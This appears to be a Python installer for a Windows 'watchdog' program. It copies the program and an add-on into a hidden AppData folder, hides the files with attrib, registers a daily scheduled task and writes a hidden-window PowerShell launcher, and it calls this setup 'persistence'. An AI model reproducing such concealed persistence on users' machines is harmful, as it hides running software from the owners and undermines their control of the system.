import os
import sys
import shutil
import subprocess
import tempfile
import json

HIDE_DIR = os.path.expandvars('%APPDATA%\\LocalName')
TASK_NAME = 'LocalNameWatchdog'

def get_watchdog_exe():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    exe_path = os.path.join(script_dir, '..', 'build', 'LocalNameWatchdog.exe')
    if os.path.exists(exe_path):
        return exe_path
    py_path = os.path.join(script_dir, 'watchdog.py')
    if os.path.exists(py_path):
        return py_path
    return None

def is_installed():
    if not os.path.exists(HIDE_DIR):
        return False
    result = subprocess.run(
        ['schtasks', '/query', '/tn', TASK_NAME, '/fo', 'LIST', '/v'],
        capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
    )
    return result.returncode == 0

def install():
    try:
        if os.path.exists(HIDE_DIR):
            shutil.rmtree(HIDE_DIR, ignore_errors=True)
        os.makedirs(HIDE_DIR, exist_ok=True)

        watchdog_src = get_watchdog_exe()
        if not watchdog_src or not os.path.exists(watchdog_src):
            return False, "Watchdog not built yet. Run build.ps1 first."

        watchdog_dest = os.path.join(HIDE_DIR, 'LocalNameWatchdog.exe')
        shutil.copy2(watchdog_src, watchdog_dest)

        addon_src = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'addon')
        addon_dest = os.path.join(HIDE_DIR, 'addon')
        if os.path.exists(addon_src):
            if os.path.exists(addon_dest):
                shutil.rmtree(addon_dest, ignore_errors=True)
            shutil.copytree(addon_src, addon_dest)

        subprocess.run(
            ['attrib', '+h', HIDE_DIR],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        subprocess.run(
            ['attrib', '+h', watchdog_dest],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        subprocess.run(
            ['schtasks', '/create', '/tn', TASK_NAME, '/tr',
             f'"{watchdog_dest}" --once',
             '/sc', 'daily', '/st', '00:00', '/f',
             '/rl', 'limited'],
            capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        hidden_ps1 = os.path.join(HIDE_DIR, 'run_hidden.ps1')
        ps1_content = f'''
$wc = New-Object System.Net.WebClient
Start-Process -WindowStyle Hidden -FilePath "{watchdog_dest}" -ArgumentList "--once"
'''
        with open(hidden_ps1, 'w') as f:
            f.write(ps1_content.strip())
        subprocess.run(['attrib', '+h', hidden_ps1], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)

        return True, f"Installed at {HIDE_DIR}"
    except Exception as e:
        return False, str(e)

def uninstall():
    try:
        subprocess.run(
            ['schtasks', '/delete', '/tn', TASK_NAME, '/f'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        if os.path.exists(HIDE_DIR):
            shutil.rmtree(HIDE_DIR, ignore_errors=True)
        return True, "Persistence removed"
    except Exception as e:
        return False, str(e)

def run_once_now():
    watchdog = get_watchdog_exe()
    if not watchdog:
        return False, "Watchdog not found"
    subprocess.Popen(
        [watchdog, '--once'],
        creationflags=subprocess.CREATE_NO_WINDOW,
        shell=False
    )
    return True, "Watchdog triggered"
